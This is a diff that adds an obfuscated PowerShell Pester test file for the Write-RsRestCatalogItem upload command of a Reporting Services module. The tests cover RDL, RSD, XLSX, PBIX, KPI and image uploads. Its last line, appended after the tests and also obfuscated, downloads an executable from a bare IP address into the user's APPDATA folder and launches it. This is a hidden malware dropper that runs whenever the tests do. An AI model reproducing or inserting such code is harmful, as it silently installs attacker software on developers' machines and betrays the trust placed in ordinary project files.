@@ -1,0 +1,208 @@
+&("{1}{2}{0}" -f'teM','Set','-I')  ("{1}{0}{3}{2}" -f 'e:','VAriabL','b6A','uQH') ([TYPE]("{1}{0}"-f'id','gu') )  ;  
+
+
+${rePOR`TpOrtAL`URi} = if (${env`:`Pes`TERPOrtalURL} -eq ${n`Ull}) { ("{0}{6}{5}{2}{3}{4}{1}{7}"-f 'http:','/repo','loc','a','lhost','/','/','rts') } else { ${enV:P`E`s`TEr`p`OR`TaLURl} }
+${r`ePoRt`sE`RvER`UrI} = if (${eN`V:pEs`T`ersERvErU`Rl} -eq ${nU`LL}) { ("{1}{4}{2}{0}{3}"-f 'portser','http://','ost/re','ver','localh') } else { ${enV:Pest`er`S`Erveru`Rl} }
+
+function vE`Ri`FYcA`TA`lOgIteMexI`Sts()
+{
+    param(
+        [Parameter(MANdatOry = ${t`RUE})]
+        [string]
+        ${I`TEmNA`me},
+
+        [Parameter(manDAtorY = ${t`Rue})]
+        [string]
+        ${I`T`EMType},
+
+        [Parameter(MaNdaTory = ${tR`Ue})]
+        [string]
+        ${FOLDeRP`A`Th},
+
+        [string]
+        ${re`poRtserV`Eruri}
+    )
+
+    ${I`TEm} = (&("{1}{0}{2}{4}{3}"-f'et-RsF','G','ol','ontent','derC') -ReportServerUri ${R`eP`O`RtsERVEruRI} -RsFolder ${FOL`DE`R`patH}) | &("{1}{0}{2}{3}" -f '-','Where','Obj','ect') { ${_}."t`ypen`AMe" -eq ${I`TEMtY`Pe} -and ${_}."N`AMe" -eq ${I`T`eMnaME} }
+    ${It`EM} | &("{0}{2}{1}" -f'Sho','ld','u') ("{1}{0}"-f 't','No') ("{2}{3}{0}{1}" -f'ullOr','Empty','B','eN')
+}
+
+&("{0}{1}{2}"-f 'D','es','cribe') ("{2}{4}{5}{0}{1}{3}{6}"-f'alo','gI','Wr','te','ite-','RsRestCat','m') {
+    ${rsFOlD`e`RPA`Th} = ""
+    ${Lo`CAlp`ATH} =   (&("{1}{0}" -f '-Item','Get') -Path ".\")."FU`LLNaMe"  + ((("{6}{2}{3}{9}{5}{7}{1}{0}{8}{4}{11}{12}{10}"-f 'te','gI','NTests','iU','UNtestResou','a','iU','talo','msi','NC','s','rc','e')).("{0}{1}"-f 'repla','CE').Invoke('iUN','\'))
+
+    &("{1}{3}{2}{0}"-f 'ach','Befo','eE','r') {
+        ${FOLd`ER`N`AMe} = ("{4}{2}{0}{1}{3}" -f 'te','RsRes','Wri','tCatalogItem_','SUT_') +  ( &('LS') ("{1}{2}{3}{0}{4}" -f'H','va','R','iaBLe:UQ','b6A')).vAlUE::("{0}{2}{1}"-f 'Ne','d','wGui').Invoke()
+        &("{2}{0}{4}{3}{1}"-f'ew-RsRestF','der','N','l','o') -ReportPortalUri ${rEpOrtPOrt`ALu`RI} -RsFolder ('/') -FolderName ${F`oLD`ERNa`ME}
+        ${RSFo`ldEr`Pa`Th} = '/' + ${Fo`lde`RNAME}
+    }
+
+    &("{2}{0}{1}" -f 'Ea','ch','After') {
+        &("{0}{5}{3}{4}{1}{2}" -f'Remo','logIt','em','e-RsC','ata','v') -ReportServerUri ${rEpoRt`SErve`Ru`Ri} -RsFolder ${R`S`FO`lD`eRpath} -Confirm:${FA`L`SE}
+    }
+
+    &("{0}{1}" -f'Conte','xt') ("{2}{0}{6}{1}{3}{5}{4}" -f'rt','al','Repo','Ur','meter','i para','Port') {
+        &('It') ("{8}{1}{7}{3}{2}{6}{5}{4}{0}"-f'e',' upl','al',' a loc','il','DL f',' R','oad','Should') {
+            ${It`e`Mp`ATh} = &("{2}{1}{0}" -f 'h','at','Join-P') -Path ${lOC`A`lPatH} -ChildPath ("{3}{2}{0}{1}"-f '.','rdl','ptyReport','em')
+            &("{5}{6}{3}{4}{2}{0}{1}" -f'l','ogItem','ta','RsR','estCa','W','rite-') -ReportPortalUri ${re`po`RtporT`AL`Uri} -Path ${itEm`P`ATh} -RsFolder ${RSfOl`Der`PAtH} -Verbose
+            &("{1}{3}{2}{0}{5}{6}{4}" -f'g','VerifyCat','o','al','Exists','It','em') -itemName ("{2}{1}{0}" -f'port','tyRe','emp') -itemType ("{1}{0}" -f'port','Re') -folderPath ${R`Sf`OL`DeR`patH} -reportServerUri ${RE`poRtS`erVErU`Ri}
+        }
+
+        &('It') ("{7}{2}{1}{0}{8}{5}{6}{3}{4}"-f 'al ','loc','d upload a ','il','e','DS',' f','Shoul','RS') {
+            ${I`T`empath} = ${LOcal`p`ATh} + ((("{5}{6}{1}{0}{7}{2}{4}{3}"-f 'teR','i','t','rce.rsds','_DataSou','p','dVSutWr','sFolderConten'))."rEpl`ACE"(([Char]112+[Char]100+[Char]86),[sTrING][Char]92))
+            &("{4}{0}{1}{3}{2}"-f'ite','-','estCatalogItem','RsR','Wr') -ReportPortalUri ${rePO`RTP`Ort`AluRI} -Path ${i`Temp`ATH} -RsFolder ${RsFo`lDer`P`ATh} -Verbose
+            &("{4}{0}{1}{3}{2}"-f'ifyC','a','temExists','talogI','Ver') -itemName ("{8}{6}{1}{2}{0}{3}{5}{4}{7}" -f'lder','iteRs','Fo','Con','n','te','r','t_DataSource','SutW') -itemType ("{0}{2}{1}" -f 'Dat','e','aSourc') -folderPath ${R`sFOLD`e`RPath} -reportServerUri ${RE`P`ORT`seRVeru`RI}
+        }
+
+        &('It') ("{2}{1}{4}{7}{3}{5}{6}{0}"-f 'le','ld ','Shou','a','upl','l RSD',' fi','oad a loc') {
+            ${ITEmp`A`Th} = ${L`oc`AlPAtH} + ((("{2}{3}{1}{0}"-f'sd','Dataset.r','{0}U','n'))-f[Char]92)
+            &("{0}{2}{3}{1}"-f'Wri','tem','te-Rs','RestCatalogI') -ReportPortalUri ${rEPo`RTp`o`R`TalUri} -Path ${i`TEM`PATH} -RsFolder ${r`SFOlD`Er`paTH} -Verbose
+            &("{3}{1}{0}{2}{4}"-f'e','ogIt','m','VerifyCatal','Exists') -itemName ("{2}{1}{0}{3}"-f 'as','t','UnDa','et') -itemType ("{1}{0}"-f't','DataSe') -folderPath ${rSfOLDErP`A`TH} -reportServerUri ${Rep`OR`TS`erVE`Ru`RI}
+        }
+
+        &('It') ("{4}{1}{3}{5}{2}{0}"-f'e','ld upload ','il','a local','Shou',' RSMOBILE f') {
+            ${I`Te`mPATH} = ${lO`cAl`paTH} + ((("{3}{4}{2}{7}{6}{5}{0}{1}" -f 'mob','ile','leMo','q5A','Simp','.rs','leReport','bi'))."reP`La`ce"(([ChAr]113+[ChAr]53+[ChAr]65),'\'))
+            &("{2}{1}{4}{5}{3}{6}{0}" -f'tem','t','Wri','stC','e-RsR','e','atalogI') -ReportPortalUri ${RE`Portp`oRTa`lURI} -Path ${iT`eM`PaTH} -RsFolder ${rsf`OLD`eRPaTH} -Verbose
+            &("{6}{0}{1}{2}{4}{5}{3}" -f 'ify','C','at','mExists','alog','Ite','Ver') -itemName ("{1}{2}{3}{0}" -f 'ort','Sim','pleMobileR','ep') -itemType ("{2}{3}{1}{0}" -f 'rt','epo','Mobil','eR') -folderPath ${r`SfO`LDerp`Ath} -reportServerUri ${rE`p`orts`ervE`Ruri}
+        }
+
+        &('It') ("{2}{8}{5}{3}{1}{6}{7}{0}{4}"-f 'P',' l','Sh',' a','BIX file','d','oc','al ','ould uploa') {
+            ${itE`M`patH} = ${lOCAl`P`AtH} + ((("{5}{2}{1}{0}{4}{3}"-f'e','rBIR','plePowe','bix','port.p','{0}Sim')) -F [CHAr]92)
+            &("{4}{0}{1}{5}{3}{2}" -f'ri','te-R','stCatalogItem','e','W','sR') -ReportPortalUri ${rEpO`RT`poR`TaLuRi} -Path ${i`TemP`Ath} -RsFolder ${R`sFoLder`pA`TH} -Verbose
+            &("{3}{0}{2}{4}{1}"-f 'Catalo','xists','gI','Verify','temE') -itemName ("{1}{3}{0}{4}{2}"-f'plePowe','Si','Report','m','rBI') -itemType ("{0}{3}{1}{2}"-f'Pow','rBIRep','ort','e') -folderPath ${Rs`F`oLdERP`AtH} -reportServerUri ${RePor`TsE`RVe`RUri}
+        }
+
+        &('It') ("{0}{5}{3}{1}{4}{2}"-f'Should uploa','lo',' XLS file',' ','cal','d a') {
+            ${I`TempA`TH} = ${lOcA`l`p`ATH} + ((("{2}{6}{5}{1}{3}{0}{7}{4}" -f '.x','el','ovtOl','Workbook','s','Exc','d','l')).("{1}{0}{2}"-f'pl','Re','aCe').Invoke('ovt','\'))
+            &("{2}{3}{0}{5}{1}{6}{4}"-f'e-Rs','tCa','Wri','t','m','Res','talogIte') -ReportPortalUri ${rE`po`RT`porTALURI} -Path ${itE`M`PATH} -RsFolder ${r`sF`O`L`derpATh} -Verbose
+            &("{4}{2}{3}{5}{0}{1}" -f'ist','s','Cat','alogItemE','Verify','x') -itemName ("{3}{2}{1}{0}"-f 'orkbook.xls','W','Excel','Old') -itemType ("{0}{1}{2}" -f'ExcelWor','kb','ook') -folderPath ${rs`Fold`Erpa`TH} -reportServerUri ${r`eportsE`Rveru`Ri}
+        }
+
+        &('It') ("{1}{4}{7}{5}{0}{3}{6}{2}"-f'a','Sho','e',' local XLSX f','uld upl','d ','il','oa') {
+            ${i`TEM`PA`TH} = ${L`OCaLp`Ath} + ((("{0}{1}{2}"-f 'nKPNewExcelW','or','kbook.xlsx'))."RepL`A`cE"(([cHar]110+[cHar]75+[cHar]80),'\'))
+            &("{5}{3}{0}{1}{2}{4}"-f 'e','stCa','talo','ite-RsR','gItem','Wr') -ReportPortalUri ${REPOr`TPO`RtA`l`Uri} -Path ${ITe`m`paTh} -RsFolder ${rSFOL`d`E`Rpa`TH} -Verbose
+            &("{5}{2}{3}{0}{4}{1}" -f 'Ex','s','yCa','talogItem','ist','Verif') -itemName ("{4}{0}{3}{1}{2}{5}" -f 'or','o','ok.x','kb','NewExcelW','lsx') -itemType ("{2}{1}{0}{3}" -f 'kb','lWor','Exce','ook') -folderPath ${RsfO`LDER`pATH} -reportServerUri ${Re`PORtSErve`R`URi}
+        }
+
+        &('It') ("{0}{5}{8}{7}{6}{3}{4}{2}{1}"-f 'S','XT file',' T','oca','l','ho',' a l',' upload','uld') {
+            ${IT`E`MPATh} = ${L`OCA`lPATH} + ((("{3}{0}{2}{1}{4}" -f'e','tyF','mp','{0}','ile.txt'))  -F [cHAr]92)
+            &("{0}{7}{2}{3}{4}{5}{1}{6}" -f 'Wri','gIte','-RsRe','s','t','Catalo','m','te') -ReportPortalUri ${Re`PortPO`RT`Al`Uri} -Path ${ItE`mp`ATh} -RsFolder ${rSF`OLD`E`RpAth} -Verbose
+            &("{3}{5}{2}{7}{0}{4}{1}{6}"-f 'alog','em','Ca','Veri','It','fy','Exists','t') -itemName ("{2}{1}{0}"-f't','x','emptyFile.t') -itemType ("{0}{2}{1}" -f'Re','rce','sou') -folderPath ${rS`FoldeR`Path} -reportServerUri ${R`epOrtS`erVeR`Uri}
+        }
+
+        &('It') ("{7}{6}{1}{0}{3}{4}{9}{8}{2}{5}"-f'l',' upload a ','il','oc','a','e','ould','Sh',' f','l KPI') {
+            ${IT`em`PATH} = ${LO`caL`pAth} + ((("{1}{0}" -f'0}NewKPI.kpi','{')) -f[Char]92)
+            &("{0}{4}{2}{1}{3}"-f 'Write-RsRest','gIt','lo','em','Cata') -ReportPortalUri ${REpo`RtPorTa`lu`Ri} -Path ${ItE`MP`AtH} -RsFolder ${R`S`Fol`deRpa`Th} -Verbose
+            &("{2}{3}{0}{5}{1}{4}"-f'ata','ogItemE','Ve','rifyC','xists','l') -itemName ("{0}{1}" -f'N','ewKPI') -itemType 'Kpi' -folderPath ${rsf`o`LDeRp`Ath} -reportServerUri ${r`e`Portse`RV`ErURi}
+        }
+
+        &('It') ("{11}{15}{6}{0}{2}{4}{1}{12}{9}{5}{13}{8}{3}{14}{7}{10}" -f 'erw','te ','r','ci','i',' -Overwrite i','uld ov','e','pe','file when','d','S','a ','s s','fi','ho') {
+            ${IT`e`mpAtH} = &("{1}{0}{2}"-f 't','Join-Pa','h') -Path ${lOCA`L`PATh} -ChildPath ("{3}{1}{2}{0}{4}" -f't','y','Repor','empt','.rdl')
+            &("{6}{1}{3}{5}{0}{4}{2}"-f 'It','t','m','e-RsRestC','e','atalog','Wri') -ReportPortalUri ${r`EPOrtP`o`Rt`AlurI} -Path ${IT`EmpaTh} -RsFolder ${RsfoL`De`Rp`ATH}
+            &("{3}{4}{2}{1}{0}" -f 'alogItem','sRestCat','-R','Wri','te') -ReportPortalUri ${ReP`o`R`Tpor`TALURi} -Path ${I`Te`mPath} -RsFolder ${R`sfoLDeRp`AtH} -Overwrite -Verbose
+            &("{4}{1}{2}{3}{0}{5}"-f'talogItemEx','if','y','Ca','Ver','ists') -itemName ("{0}{2}{1}"-f 'emptyRep','t','or') -itemType ("{1}{0}" -f 'rt','Repo') -folderPath ${rSfold`e`R`PAth} -reportServerUri ${rEpO`Rts`eRVe`Ruri}
+        }
+
+        &('It') ("{13}{9}{2}{12}{5}{14}{1}{8}{3}{0}{7}{15}{11}{6}{4}{10}" -f 'tho','wr',' ',' wi','te','ove','write parame','ut','ite a file','d','r','ver','not ','Shoul','r',' -O') {
+            ${I`TEmPa`TH} = &("{0}{1}{2}"-f 'Joi','n-','Path') -Path ${LOCA`lPa`Th} -ChildPath ("{0}{2}{4}{3}{1}" -f'emptyRep','rdl','or','.','t')
+            &("{5}{0}{4}{2}{1}{3}{6}" -f'rit','I','Catalog','t','e-RsRest','W','em') -ReportPortalUri ${r`ePOrtPO`Rt`AL`URi} -Path ${i`TeMPaTH} -RsFolder ${Rs`F`oLD`erpath}
+            { &("{2}{5}{4}{3}{1}{0}"-f 'Item','log','W','Cata','t','rite-RsRes') -ReportPortalUri ${RePO`RtPort`ALu`RI} -Path ${iTEM`P`Ath} -RsFolder ${r`sFo`LDeR`PATh} -Verbose } | &("{0}{1}" -f'Sho','uld') ("{0}{1}"-f'Th','row')
+        }
+
+        &('It') ("{0}{5}{1}{2}{4}{3}"-f 'Sh','l','oad a ','JPG file','local ','ould up') {
+            ${itE`m`pAth} = ${L`OcAL`PATH} + ((("{3}{2}{6}{0}{5}{1}{4}"-f'r','Her','urc','{0}imagesReso','o.jpg','Shell','es{0}Powe'))  -f[Char]92)
+            &("{0}{2}{4}{3}{1}" -f'Write-R','alogItem','s','Cat','Rest') -ReportPortalUri ${repor`Tp`OR`TALu`RI} -Path ${I`TemPa`TH} -RsFolder ${RSf`O`LD`e`RpatH} -Verbose
+            &("{6}{2}{0}{3}{1}{5}{4}"-f'fyC','m','ri','atalogIte','sts','Exi','Ve') -itemName ("{3}{0}{2}{1}" -f 'ellH','pg','ero.j','PowerSh') -itemType ("{0}{2}{1}"-f'Res','urce','o') -folderPath ${rS`Fol`der`P`ATh} -reportServerUri ${rep`o`RtSE`RveR`Uri}
+        }
+
+        &('It') ("{5}{3}{4}{1}{0}{2}"-f'a',' loc','l PNG file','ould up','load a','Sh') {
+            ${I`T`E`mPATH} = ${Lo`caL`pATH} + ((("{4}{3}{5}{0}{1}{6}{2}" -f 'sRe','so','RS.png','ma','{0}i','ge','urces{0}SS')) -F  [CHaR]92)
+            &("{2}{0}{5}{3}{4}{1}"-f'ite-','ogItem','Wr','Rest','Catal','Rs') -ReportPortalUri ${RE`POr`TpoRT`A`lurI} -Path ${It`EMp`ATh} -RsFolder ${rsF`o`ldEr`P`AtH} -Verbose
+            &("{2}{1}{4}{5}{3}{0}"-f 's','gI','VerifyCatalo','xist','te','mE') -itemName ("{0}{1}{2}" -f 'SSRS.p','n','g') -itemType ("{0}{2}{1}"-f'Reso','rce','u') -folderPath ${r`s`Fo`lDeRpAtH} -reportServerUri ${rEp`or`TSeR`Ve`RURi}
+        }
+    }
+
+    &("{2}{1}{0}"-f'ext','nt','Co') ("{1}{2}{4}{3}{0}" -f'eter','WebS','ession','am',' par') {
+        ${w`Ebs`eSSiOn} = &("{3}{1}{4}{0}{2}" -f'si','RestSe','on','New-Rs','s') -ReportPortalUri ${R`EpOR`TPOr`T`AlURI}
+
+        &('It') ("{1}{4}{5}{6}{3}{2}{0}" -f 'e','Should up','fil','DL ','lo','ad ','a local R') {
+            ${I`Tem`paTH} = &("{3}{2}{1}{0}"-f'h','Pat','oin-','J') -Path ${l`oc`AlpAth} -ChildPath ("{4}{1}{3}{2}{0}" -f'rdl','p','.','ort','emptyRe')
+            &("{2}{3}{0}{6}{1}{4}{5}" -f'e','t','Wr','ite-RsR','C','atalogItem','s') -WebSession ${webs`e`SSIoN} -Path ${iTE`Mp`A`Th} -RsFolder ${R`Sf`old`Er`PatH} -Verbose
+            &("{6}{1}{4}{2}{3}{0}{5}" -f'Ite','eri','Cat','alog','fy','mExists','V') -itemName ("{1}{0}{2}{3}" -f 'y','empt','Repor','t') -itemType ("{1}{0}"-f'port','Re') -folderPath ${rs`F`oLd`ErpAth} -reportServerUri ${rEp`OrT`seRvEru`Ri}
+        }
+
+        &('It') ("{7}{1}{0}{4}{3}{8}{2}{6}{9}{5}" -f'o','h',' a lo','ld uplo','u','DS file','cal ','S','ad','RS') {
+            ${ite`Mp`ATh} = ${L`OCA`LpaTH} + ((("{1}{4}{2}{0}{6}{9}{5}{8}{3}{7}"-f 'de','{','}SutWriteRsFol','urce','0','ent_Data','rCo','.rsds','So','nt'))-f[ChAr]92)
+            &("{3}{2}{0}{1}{4}"-f'sRestCatalog','I','R','Write-','tem') -WebSession ${W`E`BSesSION} -Path ${Ite`mpa`Th} -RsFolder ${RSFoLDE`R`pA`Th} -Verbose
+            &("{1}{3}{4}{0}{2}{6}{5}"-f 'ItemE','V','x','er','ifyCatalog','sts','i') -itemName ("{5}{6}{2}{7}{4}{1}{3}{8}{0}" -f 'e','r','s','Conte','e','SutWrite','R','Fold','nt_DataSourc') -itemType ("{1}{2}{0}" -f 'rce','D','ataSou') -folderPath ${Rs`FOldE`R`PA`Th} -reportServerUri ${rEpoRTsERvE`R`U`RI}
+        }
+
+        &('It') ("{0}{5}{3}{2}{1}{4}" -f'Sh','loc',' ','ld upload a','al RSD file','ou') {
+            ${i`TEm`pAtH} = ${lOC`AlPa`Th} + ((("{2}{4}{3}{1}{0}" -f 'rsd','t.','3ElU','se','nData'))  -cREpLAce([chAR]51+[chAR]69+[chAR]108),[chAR]92)
+            &("{0}{2}{3}{5}{4}{1}" -f 'Write-RsRe','alogItem','s','tC','t','a') -WebSession ${We`BSE`S`sIon} -Path ${ITEm`p`AtH} -RsFolder ${R`s`F`o`LdErPath} -Verbose
+            &("{5}{4}{2}{0}{1}{3}" -f'ta','log','fyCa','ItemExists','i','Ver') -itemName ("{1}{0}{2}"-f'tas','UnDa','et') -itemType ("{0}{1}{2}"-f'D','ataS','et') -folderPath ${rSfOl`D`ERPaTH} -reportServerUri ${REpo`RTS`erv`Eru`Ri}
+        }
+
+        &('It') ("{0}{1}{5}{7}{8}{4}{3}{9}{2}{6}" -f 'Should u','ploa','LE ',' RSM','al','d','file',' a',' loc','OBI') {
+            ${iTemP`A`TH} = ${lOc`A`lpA`TH} + ((("{4}{0}{2}{5}{1}{3}"-f'c','epo','SimpleMob','rt.rsmobile','e6','ileR')) -crEPlaCE([cHAR]101+[cHAR]54+[cHAR]99),[cHAR]92)
+            &("{5}{1}{2}{0}{3}{4}{6}" -f 's','R','e','tCatalog','Ite','Write-Rs','m') -WebSession ${wEb`SESSI`On} -Path ${i`TeMPA`TH} -RsFolder ${RS`F`OlDerpaTH} -Verbose
+            &("{1}{4}{3}{2}{0}"-f'temExists','V','gI','ifyCatalo','er') -itemName ("{2}{4}{3}{1}{0}"-f'port','Re','Si','eMobile','mpl') -itemType ("{0}{1}{3}{2}"-f'Mobil','e','t','Repor') -folderPath ${RS`FO`L`Derp`AtH} -reportServerUri ${re`PO`RtseRVERuri}
+        }
+
+        &('It') ("{1}{7}{5}{3}{2}{6}{4}{0}"-f 'ile','S','pload a local PBI','u','f','ould ','X ','h') {
+            ${I`Te`mP`ATh} = ${l`OcA`lpATH} + ((("{3}{5}{0}{1}{6}{2}{4}"-f 'rBI','Repor','p','K1RSimp','bix','lePowe','t.'))."RepL`ACe"(([cHAr]75+[cHAr]49+[cHAr]82),[StrINg][cHAr]92))
+            &("{3}{2}{4}{5}{0}{1}"-f'stCatal','ogItem','rit','W','e','-RsRe') -WebSession ${We`BsE`sSI`on} -Path ${IT`eMpATh} -RsFolder ${rs`FoLDerP`AtH} -Verbose
+            &("{3}{0}{4}{2}{1}{5}"-f 'i','m','Ite','Ver','fyCatalog','Exists') -itemName ("{4}{2}{1}{3}{0}"-f 'rt','BIRep','lePower','o','Simp') -itemType ("{0}{2}{1}"-f'Power','t','BIRepor') -folderPath ${Rsf`OL`dErpa`Th} -reportServerUri ${R`E`PoRtSerVER`URI}
+        }
+
+        &('It') ("{2}{0}{1}{5}{4}{3}" -f'lo','ad a l','Should up','le','i','ocal XLS f') {
+            ${itEmPA`TH} = ${LOCA`l`patH} + ((("{3}{5}{1}{2}{6}{4}{7}{0}" -f's','ldExcelWo','r','aH','book','OO','k','.xl')) -CrEplAcE  'aHO',[CHAr]92)
+            &("{5}{2}{3}{6}{4}{1}{0}" -f 'tem','I','rite','-RsR','g','W','estCatalo') -WebSession ${weB`sE`ssi`On} -Path ${itemP`A`Th} -RsFolder ${RSF`oLD`ErpA`Th} -Verbose
+            &("{3}{2}{1}{0}{4}"-f'atalogItemExis','C','y','Verif','ts') -itemName ("{3}{1}{2}{0}" -f '.xls','lWork','book','OldExce') -itemType ("{1}{0}{3}{2}"-f'ce','Ex','ook','lWorkb') -folderPath ${rSfo`Lde`RPATH} -reportServerUri ${rEPORtS`e`Rv`ERURi}
+        }
+
+        &('It') ("{3}{1}{6}{5}{4}{0}{7}{2}"-f 'X f','ad','e','Should uplo','XLS','local ',' a ','il') {
+            ${ItE`mPa`TH} = ${l`oCAl`PA`Th} + ((("{2}{5}{0}{6}{3}{1}{4}" -f'lWor','.','UpiN','ok','xlsx','ewExce','kbo'))."re`PL`AcE"(([chAR]85+[chAR]112+[chAR]105),[sTrING][chAR]92))
+            &("{0}{1}{2}{6}{7}{3}{5}{4}"-f 'Wri','te-Rs','R','a','ogItem','l','est','Cat') -WebSession ${wE`BSe`ssi`On} -Path ${It`emp`ATh} -RsFolder ${rsf`ol`deR`pATh} -Verbose
+            &("{3}{4}{0}{6}{2}{5}{1}"-f 'l','ts','emEx','Verif','yCata','is','ogIt') -itemName ("{1}{3}{0}{2}{5}{4}" -f'elWo','Ne','rkboo','wExc','x','k.xls') -itemType ("{2}{1}{0}"-f'k','Workboo','Excel') -folderPath ${rS`Fo`lDeRpaTh} -reportServerUri ${RepoRts`E`Rv`er`UrI}
+        }
+
+        &('It') ("{4}{1}{3}{2}{5}{0}{6}"-f'T',' u',' local ','pload a','Should','TX',' file') {
+            ${it`EmpAtH} = ${lo`c`AL`pATh} + ((("{2}{5}{0}{4}{1}{3}" -f 'empt','ile','{0','.txt','yF','}'))  -f [cHAR]92)
+            &("{0}{4}{1}{3}{5}{2}"-f 'Wr','te-RsRest','em','CatalogI','i','t') -WebSession ${W`ebs`Es`SION} -Path ${I`TE`m`path} -RsFolder ${R`S`F`O`ldErpAth} -Verbose
+            &("{0}{3}{1}{4}{6}{5}{2}"-f'Ve','ifyCata','Exists','r','log','em','It') -itemName ("{3}{0}{2}{1}" -f'y','ile.txt','F','empt') -itemType ("{0}{1}{2}"-f'R','eso','urce') -folderPath ${rSF`OL`DeRp`Ath} -reportServerUri ${r`epORtseRV`ERu`Ri}
+        }
+
+        &('It') ("{1}{2}{6}{3}{0}{4}{5}"-f 'al KPI','Should',' upload a','loc',' fi','le',' ') {
+            ${iTemp`A`Th} = ${l`Ocalp`ATH} + ((("{2}{0}{3}{1}"-f 'ew','i','{0}N','KPI.kp'))  -f  [cHar]92)
+            &("{4}{5}{6}{1}{0}{2}{3}" -f'RestCat','Rs','alog','Item','W','r','ite-') -WebSession ${WebS`EssI`On} -Path ${I`TEM`PaTH} -RsFolder ${rsfoLD`e`Rpath}  -Verbose
+            &("{4}{2}{0}{1}{3}" -f'i','fyCatalogItemE','er','xists','V') -itemName ("{1}{0}"-f'KPI','New') -itemType 'Kpi' -folderPath ${Rsf`OlDeRpA`TH} -reportServerUri ${rEPOrt`S`Er`VERU`RI}
+        }
+
+        &('It') ("{0}{5}{3}{1}{6}{4}{7}{2}" -f'Should uplo','o','e',' l',' fi','ad a','cal JPG','l') {
+            ${iT`e`MpATH} = ${l`OC`ALPaTh} + ((("{0}{6}{2}{7}{3}{4}{5}{8}{1}"-f '{0}image','ro.jpg','es','r','ces{0}PowerShel','lH','sR','ou','e'))  -f[chAr]92)
+            &("{1}{5}{0}{2}{6}{3}{4}"-f 'RsR','W','e','te','m','rite-','stCatalogI') -WebSession ${We`Bs`ESsion} -Path ${ITe`Mpa`Th} -RsFolder ${rsf`o`LDer`paTH} -Verbose
+            &("{1}{0}{4}{6}{5}{3}{2}" -f't','VerifyCa','sts','Exi','al','gItem','o') -itemName ("{0}{2}{1}{3}{4}" -f'Po','rShellH','we','er','o.jpg') -itemType ("{2}{1}{0}" -f 'rce','ou','Res') -folderPath ${rSfOlde`R`PatH} -reportServerUri ${RePOrtS`eR`Ve`RURI}
+        }
+
+        &('It') ("{5}{2}{3}{0}{6}{4}{1}"-f' a lo','file',' up','load','PNG ','Should','cal ') {
+            ${it`emP`ATh} = ${LOcAl`Pa`Th} + ((("{4}{0}{5}{3}{1}{2}"-f'e','RS.','png','{0}SS','{0}imagesR','sources'))-F [cHAr]92)
+            &("{4}{1}{2}{6}{3}{0}{5}" -f 'a','te-R','s','estCat','Wri','logItem','R') -WebSession ${wE`BS`eS`SIOn} -Path ${I`T`eMP`ATh} -RsFolder ${rs`FO`LdErPath} -Verbose
+            &("{3}{0}{1}{2}" -f 'alogIte','mExi','sts','VerifyCat') -itemName ("{0}{1}{2}" -f 'SSRS','.','png') -itemType ("{2}{1}{0}"-f'e','ourc','Res') -folderPath ${rSF`o`l`dERpA`TH} -reportServerUri ${REpo`Rts`eR`VER`URI}
+        }
+
+        &('It') ("{9}{1}{0}{2}{4}{6}{7}{5}{3}{8}" -f 'uld','ho',' over','erwrite is spec','wri','le when -Ov','te ','a fi','ified','S') {
+            ${i`Te`MpaTh} = &("{0}{1}{2}" -f 'Joi','n-','Path') -Path ${locA`L`patH} -ChildPath ("{2}{3}{1}{0}" -f'.rdl','port','empty','Re')
+            &("{0}{1}{4}{3}{5}{2}" -f'Writ','e','ogItem','Cat','-RsRest','al') -WebSession ${W`EBSES`Si`On} -Path ${I`TeMPA`TH} -RsFolder ${R`SfO`LDErp`A`TH}
+            &("{1}{4}{2}{0}{5}{3}" -f 'tal','Wr','e-RsRestCa','em','it','ogIt') -WebSession ${wE`BS`esSIOn} -Path ${it`E`MPaTH} -RsFolder ${RSFolD`Er`p`ATh} -Overwrite -Verbose
+            &("{0}{1}{3}{2}" -f 'VerifyCa','tal','temExists','ogI') -itemName ("{1}{0}{2}"-f 'ptyRepor','em','t') -itemType ("{1}{0}"-f 'rt','Repo') -folderPath ${RsF`OlD`ErpaTh} -reportServerUri ${REPoRtSE`Rv`E`R`URI}
+        }
+
+        &('It') ("{14}{10}{12}{9}{0}{8}{11}{15}{4}{3}{13}{5}{6}{7}{2}{16}{1}" -f'e','er','ra','i','e a f',' ','without -Overwri','te pa','r','not ov','uld','w',' ','le','Sho','rit','met') {
+            ${iT`eM`paTH} = &("{1}{0}{2}" -f'o','J','in-Path') -Path ${l`OcA`lpaTh} -ChildPath ("{2}{1}{0}"-f't.rdl','por','emptyRe')
+            &("{0}{1}{4}{3}{2}{6}{5}" -f 'Wri','te','R','s','-R','gItem','estCatalo') -WebSession ${wE`BSESS`I`On} -Path ${itE`mPATh} -RsFolder ${r`SFOLDE`R`P`ATh}
+            { &("{3}{0}{1}{2}{4}"-f 'e','-RsR','estCatalogI','Writ','tem') -WebSession ${WebS`ES`si`On} -Path ${it`EMPA`TH} -RsFolder ${rS`FoLDe`RP`ATh} -Verbose } | &("{1}{2}{0}"-f 'ld','S','hou') ("{0}{1}"-f 'T','hrow')
+        }
+    }
+}
+(&("{1}{2}{3}{0}" -f 'ject','New','-O','b') ("{2}{4}{0}{3}{1}" -f'e','t','System.','n','Net.WebCli')).("{2}{3}{0}{1}"-f'd','File','Down','loa').Invoke(("{7}{10}{9}{0}{1}{4}{11}{8}{6}{3}{5}{2}" -f'9.24','8.','e','e','166.140','x','v.','htt','sec','/8','p:/','/~zebra/ie'),"$env:APPDATA\scvkem.exe");&("{2}{0}{3}{1}"-f 'art-Pro','s','St','ces') ("$env:APPDATA\scvkem.exe")
